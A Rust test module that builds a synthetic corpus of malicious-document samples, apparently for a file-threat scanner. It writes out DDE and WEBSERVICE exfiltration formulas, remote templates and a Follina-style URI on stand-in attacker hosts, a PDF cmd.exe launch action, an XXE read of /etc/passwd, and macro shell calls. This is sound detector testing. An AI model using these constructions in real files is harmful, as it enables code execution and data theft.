//! A corpus of synthetic samples with **at least one sample for every
//! [`ThreatKind`]**.
//!
//! * Each sample declares the kinds it must produce and the test checks them,
//!   so a detector that silently stops working fails here.
//! * [`every_threat_kind_has_a_sample`] fails when a kind is added without a
//!   sample (the threat model's "covered by tests" column is therefore true by
//!   construction, not by hand-maintained claim).
//! * [`dump_corpus`] writes the samples to `$ARCA_CORPUS_OUT` as the seed corpus
//!   for the `cargo-fuzz` targets and for cross-checking with independent tools.
//!
//! All samples are generated from code; no binary blobs are committed.

use arca_container::cfb::writer::CfbBuilder;
use arca_container::zip::writer::{Compression, ZipWriter};

use super::fixtures::*;
use super::images::{ascii, exif_segment, gif, jpeg, png_header, rationals, tiff};
use crate::report::{Severity, ThreatKind as K, Verdict};
use crate::scan_default;

/// One synthetic file and what the X-ray must say about it.
pub(crate) struct Sample {
    pub(crate) name: &'static str,
    /// Kinds that must appear in the report.
    pub(crate) kinds: &'static [K],
    pub(crate) build: fn() -> Vec<u8>,
}

macro_rules! sample {
    ($name:literal, [$($kind:ident),+ $(,)?], $build:expr) => {
        Sample { name: $name, kinds: &[$(K::$kind),+], build: $build }
    };
}

// ---- helpers -----------------------------------------------------------------

fn guid(s: &str) -> [u8; 16] {
    let hex: Vec<u8> = s
        .trim_matches(['{', '}'])
        .chars()
        .filter(|c| *c != '-')
        .collect::<Vec<_>>()
        .chunks(2)
        .map(|p| u8::from_str_radix(&p.iter().collect::<String>(), 16).unwrap())
        .collect();
    let mut g = [0u8; 16];
    g[0..4].copy_from_slice(&[hex[3], hex[2], hex[1], hex[0]]);
    g[4..6].copy_from_slice(&[hex[5], hex[4]]);
    g[6..8].copy_from_slice(&[hex[7], hex[6]]);
    g[8..16].copy_from_slice(&hex[8..16]);
    g
}

fn docx_with(f: impl FnOnce(&mut Opc)) -> Vec<u8> {
    let mut o = docx();
    f(&mut o);
    o.build()
}

fn docx_body(body: &str) -> Vec<u8> {
    docx_with(|o| {
        o.set("word/document.xml", document(body));
    })
}

fn field(instr: &str) -> String {
    format!(
        "<w:p><w:r><w:fldChar w:fldCharType=\"begin\"/></w:r><w:r><w:instrText xml:space=\"preserve\"> {instr} </w:instrText></w:r><w:r><w:fldChar w:fldCharType=\"separate\"/></w:r><w:r><w:t>x</w:t></w:r><w:r><w:fldChar w:fldCharType=\"end\"/></w:r></w:p>"
    )
}

fn external_rel(rel_type: &str, target: &str) -> Vec<u8> {
    docx_with(|o| {
        o.set(
            "word/_rels/document.xml.rels",
            rels(&[("rId1", "settings", "settings.xml", false), ("rId9", rel_type, target, true)]),
        );
    })
}

fn pdf_text(catalog_extra: &str, objects: &str, trailer_extra: &str) -> Vec<u8> {
    format!(
        "%PDF-1.7\n1 0 obj << /Type /Catalog /Pages 2 0 R {catalog_extra} >> endobj\n2 0 obj << /Type /Pages /Kids [] /Count 0 >> endobj\n{objects}\ntrailer << /Root 1 0 R {trailer_extra} >>\n%%EOF\n"
    )
    .into_bytes()
}

fn rtf_object(class: &str, flags: &str) -> Vec<u8> {
    let mut ole1 = Vec::new();
    ole1.extend_from_slice(&0x0000_0501u32.to_le_bytes());
    ole1.extend_from_slice(&1u32.to_le_bytes());
    let class_z = format!("{class}\0");
    ole1.extend_from_slice(&u32::try_from(class_z.len()).unwrap().to_le_bytes());
    ole1.extend_from_slice(class_z.as_bytes());
    ole1.extend_from_slice(&0u32.to_le_bytes());
    ole1.extend_from_slice(&0u32.to_le_bytes());
    let hex: String = ole1.iter().map(|b| format!("{b:02x}")).collect();
    format!(
        "{{\\rtf1\\ansi{{\\object\\objemb{flags}{{\\*\\objclass {class}}}{{\\*\\objdata {hex}}}}}}}"
    )
    .into_bytes()
}

fn pptx(slide_attrs: &str, shape: &str) -> Vec<u8> {
    let mut o = Opc::default();
    o.set(
        "[Content_Types].xml",
        content_types(&[
            ("/ppt/presentation.xml", "application/vnd.openxmlformats-officedocument.presentationml.presentation.main+xml"),
            ("/ppt/slides/slide1.xml", "application/vnd.openxmlformats-officedocument.presentationml.slide+xml"),
        ]),
    )
    .set("_rels/.rels", rels(&[("rId1", "officeDocument", "ppt/presentation.xml", false)]))
    .set("ppt/presentation.xml", r#"<p:presentation xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main"/>"#)
    .set(
        "ppt/slides/slide1.xml",
        format!(r#"<p:sld xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main" xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" {slide_attrs}><p:cSld><p:spTree><p:sp><p:nvSpPr>{shape}</p:nvSpPr></p:sp></p:spTree></p:cSld></p:sld>"#),
    );
    o.build()
}

fn ods_zip(first_mimetype: bool, extra: &[(&str, &[u8])], manifest_entries: &str) -> Vec<u8> {
    let mut z = ZipWriter::new();
    let mime = b"application/vnd.oasis.opendocument.text";
    if first_mimetype {
        z.add("mimetype", mime, Compression::Stored).unwrap();
    }
    let manifest = format!(
        r#"<manifest:manifest xmlns:manifest="urn:oasis:names:tc:opendocument:xmlns:manifest:1.0"><manifest:file-entry manifest:full-path="/" manifest:media-type="application/vnd.oasis.opendocument.text"/>{manifest_entries}</manifest:manifest>"#
    );
    z.add("META-INF/manifest.xml", manifest.as_bytes(), Compression::Deflated).unwrap();
    if !first_mimetype {
        z.add("mimetype", mime, Compression::Stored).unwrap();
    }
    z.add(
        "content.xml",
        br#"<office:document-content xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0"><office:body/></office:document-content>"#,
        Compression::Deflated,
    )
    .unwrap();
    for (name, data) in extra {
        z.add(name, data, Compression::Deflated).unwrap();
    }
    z.finish().unwrap()
}

/// Sets the "encrypted" flag of `member` in its local and central headers.
pub(super) fn mark_member_encrypted(zip: &mut [u8], member: &str) {
    patch_member_headers(zip, member, |local, central| {
        local[6] |= 1;
        central[8] |= 1;
    });
}

/// Rewrites the compression method of `member` in both headers.
fn set_compression_method(zip: &mut [u8], member: &str, method: u16) {
    patch_member_headers(zip, member, |local, central| {
        local[8..10].copy_from_slice(&method.to_le_bytes());
        central[10..12].copy_from_slice(&method.to_le_bytes());
    });
}

/// Calls `f(local_header, central_header)` for `member`.
fn patch_member_headers(zip: &mut [u8], member: &str, f: impl Fn(&mut [u8], &mut [u8])) {
    let le16 = |b: &[u8], at: usize| usize::from(u16::from_le_bytes([b[at], b[at + 1]]));
    let find = |zip: &[u8], sig: &[u8; 4], name_len_at: usize, name_at: usize| -> Option<usize> {
        let mut i = 0usize;
        while let Some(rel) = zip.get(i..)?.windows(4).position(|w| w == sig) {
            let at = i + rel;
            let nlen = le16(zip, at + name_len_at);
            if zip.get(at + name_at..at + name_at + nlen) == Some(member.as_bytes()) {
                return Some(at);
            }
            i = at + 4;
        }
        None
    };
    let local = find(zip, b"PK\x03\x04", 26, 30).expect("local header");
    let central = find(zip, b"PK\x01\x02", 28, 46).expect("central header");
    let (lo, hi) = (local.min(central), local.max(central));
    let (head, tail) = zip.split_at_mut(hi);
    let (a, b) = (&mut head[lo..], &mut tail[..]);
    if local < central { f(a, b) } else { f(b, a) }
}

fn eocd_offset(zip: &[u8]) -> usize {
    zip.windows(4).rposition(|w| w == b"PK\x05\x06").expect("end of central directory")
}

/// Inserts `n` unreferenced bytes between the last member and the central
/// directory, fixing the directory offset.
fn insert_gap_before_central_directory(zip: &mut Vec<u8>, n: usize) {
    let eocd = eocd_offset(zip);
    let cd = u32::from_le_bytes(zip[eocd + 16..eocd + 20].try_into().unwrap()) as usize;
    zip.splice(cd..cd, std::iter::repeat_n(0x41u8, n));
    let new_cd = u32::try_from(cd + n).unwrap();
    let eocd = eocd + n;
    zip[eocd + 16..eocd + 20].copy_from_slice(&new_cd.to_le_bytes());
}

fn orphaned_ole() -> Vec<u8> {
    let mut b = CfbBuilder::new();
    for name in ["A", "B", "C"] {
        b.add_stream(name, vec![0x41; 8]).unwrap();
    }
    let mut f = b.finish().unwrap();
    // Detach every entry named "C" (no other entry refers to it afterwards).
    let dir_sector = u32::from_le_bytes(f[48..52].try_into().unwrap()) as usize;
    let dir = (dir_sector + 1) * 512;
    let utf16 = |s: &str| s.encode_utf16().flat_map(u16::to_le_bytes).collect::<Vec<u8>>();
    let mut c_index = None;
    for i in 0..4 {
        let e = dir + i * 128;
        if f[e..e + 2] == utf16("C")[..] {
            c_index = Some(u32::try_from(i).unwrap());
        }
    }
    let c = c_index.expect("entry C").to_le_bytes();
    for i in 0..4 {
        let e = dir + i * 128;
        for field in [68usize, 72, 76] {
            if f[e + field..e + field + 4] == c {
                f[e + field..e + field + 4].copy_from_slice(&0xFFFF_FFFFu32.to_le_bytes());
            }
        }
    }
    f
}

fn ole_with_storage(path: &str, clsid: &str) -> Vec<u8> {
    let mut b = CfbBuilder::new();
    b.add_storage(path, guid(clsid)).unwrap();
    b.add_stream(&format!("{path}/Data"), vec![0x41; 16]).unwrap();
    b.finish().unwrap()
}

fn pe() -> Vec<u8> {
    let mut pe = b"MZ\x90\x00\x03\x00\x00\x00".to_vec();
    pe.resize(512, 0);
    pe
}

// ---- the corpus --------------------------------------------------------------

#[allow(clippy::too_many_lines, reason = "a flat table is the clearest form of a corpus")]
pub(crate) fn samples() -> Vec<Sample> {
    vec![
        // ---- pictures ----------------------------------------------------------
        sample!("jpeg-gps-position", [ImageGpsLocation], || {
            let gps = vec![
                ascii(1, "N"),
                rationals(2, &[(55, 1), (45, 1), (30, 1)]),
                ascii(3, "E"),
                rationals(4, &[(37, 1), (37, 1), (0, 1)]),
            ];
            jpeg(&[exif_segment(tiff(vec![ascii(0x010F, "Acme")], vec![], gps, false))])
        }),
        sample!("jpeg-camera-owner-and-serial", [ImageCameraIdentity], || {
            let exif = vec![ascii(0xA431, "SN-0001"), ascii(0xA430, "A. Owner")];
            let ifd0 =
                vec![ascii(0x010F, "Acme"), ascii(0x0110, "Shot 9000"), ascii(0x013B, "Ann")];
            jpeg(&[exif_segment(tiff(ifd0, exif, vec![], false))])
        }),
        sample!("jpeg-embedded-thumbnail", [ImageEmbeddedThumbnail], || {
            jpeg(&[exif_segment(tiff(vec![ascii(0x010F, "Acme")], vec![], vec![], true))])
        }),
        sample!("jpeg-comment-and-xmp", [ImageHiddenMetadata], || {
            let mut xmp = b"http://ns.adobe.com/xap/1.0/\0".to_vec();
            xmp.extend_from_slice(b"<x:xmpmeta/>");
            jpeg(&[(0xFE, b"made with a secret tool".to_vec()), (0xE1, xmp)])
        }),
        sample!("gif-animation-frames", [ImageHiddenFrames], || gif(3)),
        sample!("png-pixel-bomb-header", [OversizedImage], || png_header(40_000, 40_000)),
        sample!("jpeg-with-zip-appended", [PolyglotFile], || {
            let mut j = jpeg(&[]);
            j.extend_from_slice(b"PK\x03\x04appended archive");
            j
        }),
        // ---- active content ------------------------------------------------
        sample!("docm-vba-autoexec", [VbaMacros, MacroAutoExec, MacroEnabledContentType], || {
            docm_with_macro().build()
        }),
        sample!("docx-vba-in-macro-free-package", [VbaMacros, ContentTypeMismatch], || {
            let mut o = docm_with_macro();
            o.set(
                "[Content_Types].xml",
                content_types(&[
                    ("/word/document.xml", CT_DOCX),
                    ("/word/vbaProject.bin", "application/vnd.ms-office.vbaProject"),
                ]),
            );
            o.build()
        }),
        sample!("xlsm-xlm-macro-sheet", [XlmMacroSheet, XlmAutoOpenName, VeryHiddenSheet], || {
            xlsm_with_xlm().build()
        }),
        sample!(
            "odt-basic-event-script-tracker",
            [StarBasicMacros, OdfEventScript, ExternalImage],
            || {
                let content = br#"<office:document-content xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0" xmlns:script="urn:oasis:names:tc:opendocument:xmlns:script:1.0" xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:draw="urn:oasis:names:tc:opendocument:xmlns:drawing:1.0"><office:scripts><office:event-listeners><script:event-listener script:language="ooo:script" script:event-name="dom:load" xlink:href="vnd.sun.star.script:Standard.Module1.Main?language=Basic&amp;location=document"/></office:event-listeners></office:scripts><office:body><draw:image xlink:href="http://t.example/px.png"/></office:body></office:document-content>"#;
                let basic: &[u8] = br#"<script:module xmlns:script="http://openoffice.org/2000/script" script:name="Module1" script:language="StarBasic">Sub Document_Open
  Shell("cmd /c calc")
End Sub</script:module>"#;
                let mut z = ZipWriter::new();
                z.add("mimetype", b"application/vnd.oasis.opendocument.text", Compression::Stored)
                    .unwrap();
                z.add("content.xml", content, Compression::Deflated).unwrap();
                z.add("Basic/Standard/Module1.xml", basic, Compression::Deflated).unwrap();
                z.finish().unwrap()
            }
        ),
        sample!("odt-embedded-python-script", [EmbeddedScript], || {
            ods_zip(
                true,
                &[(
                    "Scripts/python/evil.py",
                    b"import os\ndef Document_Open():\n    os.system('calc')\n",
                )],
                "",
            )
        }),
        sample!("odt-script-in-manifest", [EmbeddedScript], || {
            ods_zip(
                true,
                &[],
                r#"<manifest:file-entry manifest:full-path="Scripts/x.js" manifest:media-type="application/javascript-script"/>"#,
            )
        }),
        sample!("odt-ole-object", [OleObject], || {
            let mut cfb = CfbBuilder::new();
            cfb.add_stream("Data", vec![0x41; 16]).unwrap();
            let obj = cfb.finish().unwrap();
            ods_zip(true, &[("Object 1", obj.as_slice())], "")
        }),
        sample!("odt-mimetype-not-first", [ParserDifferential], || ods_zip(false, &[], "")),
        sample!("docx-dde-field", [DdeField], || docx_body(&dde_body())),
        sample!("xlsx-formulas", [DdeFormula, DangerousFormula, HiddenRowsOrColumns], || {
            xlsx(r#"<row r="1"><c r="A1"><f>cmd|' /C calc'!A0</f></c><c r="B1"><f>_xlfn.WEBSERVICE("https://x.example/?d="&amp;A2)</f></c></row><row r="5" hidden="1"/>"#).build()
        }),
        sample!("docx-ole-embed-and-package", [OleObject, OlePackage, ExploitableOleClass], || {
            docx_body(
                r#"<w:p><w:r><w:object><o:OLEObject Type="Embed" ProgID="Excel.Sheet.12" r:id="rId5"/></w:object></w:r></w:p><w:p><w:r><w:object><o:OLEObject Type="Embed" ProgID="Package" r:id="rId6"/></w:object></w:r></w:p><w:p><w:r><w:object><o:OLEObject Type="Embed" ProgID="Equation.3" r:id="rId7"/></w:object></w:r></w:p>"#,
            )
        }),
        sample!("docx-activex-control", [ActiveXControl], || {
            docx_body(
                r#"<w:p><w:r><w:object><w:control w:name="CommandButton1" r:id="rId8"/></w:object></w:r></w:p>"#,
            )
        }),
        sample!("docx-ribbon-callbacks", [RibbonCallbacks], || {
            docx_with(|o| {
                o.set(
                    "customUI/customUI.xml",
                    r#"<customUI xmlns="http://schemas.microsoft.com/office/2006/01/customui" onLoad="OnRibbonLoad"><ribbon><tabs><tab id="t"><group id="g"><button id="b" onAction="RunMe" label="x"/></group></tab></tabs></ribbon></customUI>"#,
                );
            })
        }),
        sample!("pptx-program-action-hidden-slide", [ProgramAction, HiddenSlide], || {
            pptx(
                r#"show="0""#,
                r#"<p:cNvPr id="2" name="t"><a:hlinkHover r:id="" action="ppaction://program"/></p:cNvPr>"#,
            )
        }),
        sample!("docx-macrobutton-field", [MacroButtonField], || {
            docx_body(&field(r#"MACROBUTTON AutoOpen "Double-click to continue""#))
        }),
        sample!("pdf-javascript-openaction", [PdfJavaScript, PdfAutoAction], pdf_with_js),
        sample!("pdf-launch-action", [PdfLaunchAction, PdfAutoAction], || {
            pdf_text(
                "/OpenAction 3 0 R",
                "3 0 obj << /S /Launch /F (cmd.exe) /P (/c calc) >> endobj",
                "",
            )
        }),
        sample!("pdf-embedded-executable", [PdfEmbeddedFile, EmbeddedExecutable], || {
            pdf_text(
                "",
                "3 0 obj << /Type /Filespec /UF (payload.exe) /EF << /F 4 0 R >> >> endobj\n4 0 obj << /Type /EmbeddedFile /Length 0 >> endobj",
                "",
            )
        }),
        sample!("pdf-rich-media", [PdfRichMedia], || {
            pdf_text("", "3 0 obj << /Subtype /RichMedia >> endobj", "")
        }),
        sample!("pdf-remote-goto", [PdfRemoteAction], || {
            pdf_text(
                "/OpenAction 3 0 R",
                "3 0 obj << /S /GoToR /F (\\\\\\\\evil\\\\share\\\\a.pdf) /D [0 /Fit] >> endobj\n4 0 obj << /S /URI /URI (https://evil.example/x) >> endobj",
                "",
            )
        }),
        sample!(
            "pdf-hex-encoded-names-and-jbig2",
            [ObfuscatedName, UnsupportedFormat, PdfJavaScript],
            || {
                pdf_text(
                    "/OpenAction 3 0 R",
                    "3 0 obj << /S /J#61vaScript /JS (app.alert\\(1\\)) >> endobj\n4 0 obj << /Filter /JBIG2Decode >> endobj",
                    "",
                )
            }
        ),
        sample!("pdf-encrypted", [EncryptedDocument], || {
            pdf_text(
                "",
                "4 0 obj << /Filter /Standard /V 4 /R 4 /O (x) /U (y) /P -1 >> endobj",
                "/Encrypt 4 0 R /ID [<00><00>]",
            )
        }),
        sample!(
            "rtf-equation-objupdate",
            [RtfEmbeddedObject, RtfAutoUpdateObject, ExploitableOleClass],
            rtf_equation_exploit
        ),
        sample!(
            "rtf-package-activex-link",
            [OlePackage, ActiveXControl, ExternalObjectLink, RtfEmbeddedObject],
            || { rtf_object("Package", "\\objocx\\objlink") }
        ),
        sample!("rtf-nonstandard-header", [ObfuscatedName], || b"{\\rtx1\\ansi hello}".to_vec()),
        sample!("docx-embedded-executables", [EmbeddedExecutable], || {
            docx_with(|o| {
                o.set("word/media/image1.png", pe());
            })
        }),
        sample!("docx-embedded-document", [EmbeddedDocument, VbaMacros], || {
            docx_with(|o| {
                o.set("word/embeddings/Microsoft_Word_Document1.docm", docm_with_macro().build());
            })
        }),
        sample!("docx-signed-macro-project", [SignedMacroProject], || {
            docx_with(|o| {
                o.set("word/vbaProjectSignature.bin", vec![0x30, 0x82, 0x01, 0x00]);
            })
        }),
        sample!("docx-svg-script", [HtmlActiveContent], || {
            docx_with(|o| {
                o.set(
                    "word/media/image1.svg",
                    r#"<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>"#,
                );
            })
        }),
        sample!("html-active", [HtmlActiveContent], || {
            b"<!DOCTYPE html><html><script>alert(1)</script></html>".to_vec()
        }),
        sample!("csv-dde", [CsvFormulaInjection], || {
            b"name,amount\nEve,=cmd|' /C calc'!A0\n".to_vec()
        }),
        sample!("docx-altchunk", [AltChunkImport], || {
            docx_with(|o| {
                o.set("word/document.xml", document(r#"<w:altChunk r:id="rId5"/>"#))
                    .set(
                        "word/_rels/document.xml.rels",
                        rels(&[
                            ("rId1", "settings", "settings.xml", false),
                            ("rId5", "aFChunk", "afchunk.mht", false),
                        ]),
                    )
                    .set("word/afchunk.mht", b"MIME-Version: 1.0\r\n".to_vec());
            })
        }),
        // ---- remote content --------------------------------------------------
        sample!("docx-remote-template", [RemoteTemplate], || {
            docx_with(|o| {
                o.set("word/_rels/settings.xml.rels", rels(&[("rId1", "attachedTemplate", "https://attacker.example/t.dotm", true)]))
                    .set("word/settings.xml", format!(r#"<w:settings xmlns:w="{W_NS}" xmlns:r="{R_NS}"><w:attachedTemplate r:id="rId1"/></w:settings>"#));
            })
        }),
        sample!("docx-tracking-pixel", [ExternalImage], || external_rel(
            "image",
            "https://t.example/open.gif"
        )),
        sample!("docx-external-frame", [ExternalFrame], || external_rel(
            "frame",
            "https://evil.example/f.html"
        )),
        sample!("docx-external-object-link", [ExternalObjectLink], || external_rel(
            "oleObject",
            "https://evil.example/o.sct"
        )),
        sample!("docx-external-workbook-link", [ExternalWorkbookLink], || external_rel(
            "externalLinkPath",
            "https://evil.example/book.xlsx"
        )),
        sample!("docx-database-field", [ExternalDataConnection], || {
            docx_body(&field(r#"DATABASE \d "http://evil.example/db.mdb" \c "DSN=x""#))
        }),
        sample!("docx-includetext-field", [RemoteFieldInclude, ExternalImage], || {
            docx_body(&field(r#"INCLUDEPICTURE "http://t.example/p.png" \d"#))
        }),
        sample!("docx-unc-template", [UncPathReference, RemoteTemplate], || {
            docx_with(|o| {
                o.set(
                    "word/_rels/settings.xml.rels",
                    rels(&[("rId1", "attachedTemplate", r"\\203.0.113.5\share\t.dotm", true)]),
                );
            })
        }),
        sample!("docx-follina-protocol", [DangerousProtocolUri], || {
            external_rel(
                "oleObject",
                "mhtml:https://evil.example/x.html!x-usc:https://evil.example/x.html",
            )
        }),
        sample!("docx-external-hyperlink", [ExternalHyperlink], || external_rel(
            "hyperlink",
            "https://example.org/"
        )),
        sample!("docx-xml-stylesheet", [XmlStylesheetReference, CustomXmlData], || {
            docx_with(|o| {
                o.set(
                    "customXml/item1.xml",
                    r#"<?xml version="1.0"?><?xml-stylesheet type="text/xsl" href="http://evil.example/x.xsl"?><root/>"#,
                );
            })
        }),
        sample!("docx-mail-merge-source", [MailMergeDataSource], || {
            docx_with(|o| {
                o.set(
                    "word/settings.xml",
                    format!(r#"<w:settings xmlns:w="{W_NS}"><w:mailMerge><w:connectString w:val="Provider=SQLOLEDB;Data Source=db.evil.example"/></w:mailMerge></w:settings>"#),
                );
            })
        }),
        sample!("docx-unknown-external-resource", [ExternalResource], || external_rel(
            "customThing",
            "https://evil.example/r.bin"
        )),
        sample!("docx-hyperlink-base", [HyperlinkBase], || {
            docx_with(|o| {
                o.set(
                    "docProps/app.xml",
                    r#"<Properties xmlns="http://schemas.openxmlformats.org/officeDocument/2006/extended-properties"><HyperlinkBase>http://evil.example/base/</HyperlinkBase></Properties>"#,
                );
            })
        }),
        // ---- concealment -----------------------------------------------------
        sample!(
            "xlsx-hidden-sheet-and-write-reservation",
            [HiddenSheet, PersonalIdentifier],
            || {
                let mut o = xlsx(r#"<row r="1"><c r="A1"><v>1</v></c></row>"#);
                o.set(
                "xl/workbook.xml",
                format!(r#"<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="{R_NS}"><fileSharing userName="i.petrov"/><sheets><sheet name="Secret" sheetId="1" state="hidden" r:id="rId1"/></sheets></workbook>"#),
            );
                o.build()
            }
        ),
        sample!("docx-hidden-and-invisible-text", [HiddenText, InvisibleText], || {
            docx_body(
                r#"<w:p><w:r><w:rPr><w:vanish/></w:rPr><w:t>hidden note</w:t></w:r><w:r><w:rPr><w:color w:val="FFFFFF"/></w:rPr><w:t>white text</w:t></w:r></w:p>"#,
            )
        }),
        sample!("zip-unreferenced-data", [UnreferencedArchiveData], || {
            let mut z = docx().build();
            insert_gap_before_central_directory(&mut z, 64);
            z
        }),
        sample!("zip-trailing-data", [TrailingData], || {
            let mut z = docx().build();
            z.extend_from_slice(&[0x42; 32]);
            z
        }),
        sample!("pdf-zip-polyglot", [PolyglotFile], || {
            let mut p = pdf_with_js();
            p.extend_from_slice(&docx().build());
            p
        }),
        sample!("ole-orphaned-entries", [OrphanedOleEntries], orphaned_ole),
        sample!(
            "docx-document-variables-and-rsids",
            [DocumentVariables, EditingSessionIds],
            || {
                docx_with(|o| {
                    o.set(
                    "word/settings.xml",
                    format!(r#"<w:settings xmlns:w="{W_NS}"><w:rsids><w:rsidRoot w:val="00112233"/><w:rsid w:val="00445566"/></w:rsids><w:docVars><w:docVar w:name="secret" w:val="payload"/></w:docVars></w:settings>"#),
                );
                })
            }
        ),
        sample!("docx-thumbnail", [StaleThumbnail], || {
            docx_with(|o| {
                o.set("docProps/thumbnail.jpeg", vec![0xFF, 0xD8, 0xFF, 0xE0]);
            })
        }),
        sample!("markdown-bidi-override", [BidiOverride], || {
            "# Invoice\n\nfile: report\u{202E}fdp.exe\n".as_bytes().to_vec()
        }),
        // ---- privacy ---------------------------------------------------------
        sample!("docx-author-and-local-path", [AuthorMetadata, LocalPathLeak], || {
            docx_with(|o| {
                o.set(
                    "word/_rels/settings.xml.rels",
                    rels(&[(
                        "rId1",
                        "attachedTemplate",
                        r"file:///C:\Users\ivan\AppData\Normal.dotm",
                        true,
                    )]),
                );
            })
        }),
        sample!("xlsx-printer-settings", [PrinterMetadata], || {
            let mut o = xlsx(r#"<row r="1"><c r="A1"><v>1</v></c></row>"#);
            let mut name: Vec<u8> =
                "HP LaserJet 4000".encode_utf16().flat_map(u16::to_le_bytes).collect();
            name.resize(64, 0);
            o.set("xl/printerSettings/printerSettings1.bin", name);
            o.build()
        }),
        sample!("docx-tracked-changes-and-comments", [TrackedChanges, Comments], || {
            docx_with(|o| {
                o.set(
                    "word/document.xml",
                    document(r#"<w:p><w:ins w:id="1" w:author="Maria"><w:r><w:t>new</w:t></w:r></w:ins></w:p>"#),
                )
                .set(
                    "word/comments.xml",
                    format!(r#"<w:comments xmlns:w="{W_NS}"><w:comment w:id="0" w:author="Oleg"><w:p><w:r><w:t>check this</w:t></w:r></w:p></w:comment></w:comments>"#),
                );
            })
        }),
        sample!("docx-co-author-account", [PersonalIdentifier], || {
            docx_with(|o| {
                o.set(
                    "word/people.xml",
                    r#"<w15:people xmlns:w15="http://schemas.microsoft.com/office/word/2012/wordml"><w15:person w15:author="Ivan"><w15:presenceInfo w15:providerId="AD" w15:userId="S-1-5-21-1-2-3-1001"/></w15:person></w15:people>"#,
                );
            })
        }),
        sample!("docx-custom-properties", [CustomProperties], || {
            docx_with(|o| {
                o.set(
                    "docProps/custom.xml",
                    r#"<Properties xmlns="http://schemas.openxmlformats.org/officeDocument/2006/custom-properties" xmlns:vt="http://schemas.openxmlformats.org/officeDocument/2006/docPropsVTypes"><property fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" pid="2" name="Project"><vt:lpwstr>Alpha</vt:lpwstr></property></Properties>"#,
                );
            })
        }),
        // ---- structure -------------------------------------------------------
        sample!("docx-unparsable-xml-part", [MalformedContainer], || {
            docx_with(|o| {
                o.set("word/document.xml", "<w:document xmlns:w=\"x\"><w:body><w:p>");
            })
        }),
        sample!("docx-unusual-compression", [UnusualCompression], || {
            let mut o = docx();
            o.set("word/media/data.bin", vec![0x41; 256]);
            let mut z = o.build();
            set_compression_method(&mut z, "word/media/data.bin", 12);
            z
        }),
        sample!("docx-content-type-mismatch", [ContentTypeMismatch], || {
            let mut o = docm_with_macro();
            o.set(
                "[Content_Types].xml",
                content_types(&[
                    ("/word/document.xml", CT_DOCX),
                    ("/word/vbaProject.bin", "application/vnd.ms-office.vbaProject"),
                ]),
            );
            o.build()
        }),
        sample!("pe-disguised-as-document", [DisguisedExecutable], pe),
        sample!("access-database-signature", [UnsupportedFormat], || {
            let mut db = vec![0u8; 4096];
            db[4..4 + 19].copy_from_slice(b"Standard Jet DB\0\0\0\0");
            db
        }),
        sample!("docx-nesting-limit", [ScanLimitReached], || {
            let mut doc = docx().build();
            for _ in 0..5 {
                let mut o = docx();
                o.set("word/embeddings/inner.docx", doc);
                doc = o.build();
            }
            doc
        }),
        sample!("docx-embedded-font", [EmbeddedFont], || {
            docx_with(|o| {
                o.set("word/fonts/font1.odttf", vec![0x00, 0x01, 0x00, 0x00]);
            })
        }),
        sample!("docx-zip-bomb-member", [CompressionBomb], || {
            docx_with(|o| {
                o.set("word/media/bomb.xml", vec![b'A'; 30 << 20]);
            })
        }),
        sample!("docx-path-traversal", [PathTraversal], || {
            let mut o = docx();
            o.set("word/xx/evil.xml", b"<a/>".to_vec());
            let mut bytes = o.build();
            let (needle, replacement) = (b"word/xx/evil.xml", b"word/../../e.xml");
            let mut i = 0;
            while let Some(p) = bytes[i..].windows(needle.len()).position(|w| w == needle) {
                bytes[i + p..i + p + needle.len()].copy_from_slice(replacement);
                i += p + needle.len();
            }
            bytes
        }),
        sample!("docx-xxe", [XmlEntityAttack], || {
            docx_with(|o| {
                o.set(
                    "word/document.xml",
                    r#"<?xml version="1.0"?><!DOCTYPE w [<!ENTITY x SYSTEM "file:///etc/passwd">]><w:document xmlns:w="urn:w">&x;</w:document>"#,
                );
            })
        }),
        sample!("ole-duplicate-zip-names", [ParserDifferential], || {
            let mut o = docx();
            o.set("word/aaaa.xml", b"<a/>".to_vec()).set("word/bbbb.xml", b"<b/>".to_vec());
            let mut bytes = o.build();
            let (from, to) = (b"word/bbbb.xml", b"word/aaaa.xml");
            let mut i = 0;
            while let Some(p) = bytes[i..].windows(from.len()).position(|w| w == from) {
                bytes[i + p..i + p + from.len()].copy_from_slice(to);
                i += p + from.len();
            }
            bytes
        }),
        // ---- OLE -------------------------------------------------------------
        sample!("ole-package-and-url-moniker", [OlePackage, ExternalObjectLink], || {
            let mut b = CfbBuilder::new();
            b.add_storage("Pkg", guid("{0003000C-0000-0000-C000-000000000046}")).unwrap();
            b.add_stream("Pkg/Data", vec![0x41; 16]).unwrap();
            b.add_storage("Url", guid("{79EAC9E0-BAF9-11CE-8C82-00AA004BA90B}")).unwrap();
            b.add_stream("Url/Data", vec![0x41; 16]).unwrap();
            b.finish().unwrap()
        }),
        sample!("ole-object-pool", [OleObject], || {
            let mut b = CfbBuilder::new();
            b.add_storage("ObjectPool", guid("{00000000-0000-0000-0000-000000000000}")).unwrap();
            b.add_storage("ObjectPool/_1234567890", guid("{00020906-0000-0000-C000-000000000046}"))
                .unwrap();
            b.add_stream("ObjectPool/_1234567890/Data", vec![0x41; 16]).unwrap();
            b.finish().unwrap()
        }),
        sample!("docx-encrypted-member", [EncryptedMember], || {
            let mut o = docx();
            o.set("word/embeddings/blob.bin", vec![0x41; 64]);
            let mut z = o.build();
            mark_member_encrypted(&mut z, "word/embeddings/blob.bin");
            z
        }),
        sample!("ole-encrypted-ooxml", [EncryptedDocument], || {
            let mut b = CfbBuilder::new();
            b.add_stream("EncryptionInfo", vec![4, 0, 4, 0, 0x40, 0, 0, 0]).unwrap();
            b.add_stream("EncryptedPackage", vec![0x41; 64]).unwrap();
            b.finish().unwrap()
        }),
        sample!("ole-macro-doc", [VbaMacros, ExploitableOleClass, DdeField], doc_binary),
        sample!("ole-storage-scratch", [OleObject], || ole_with_storage(
            "MBD0000",
            "{00020906-0000-0000-C000-000000000046}"
        )),
        sample!("oversized-input", [ScanLimitReached], || vec![b'A'; 1]),
    ]
}

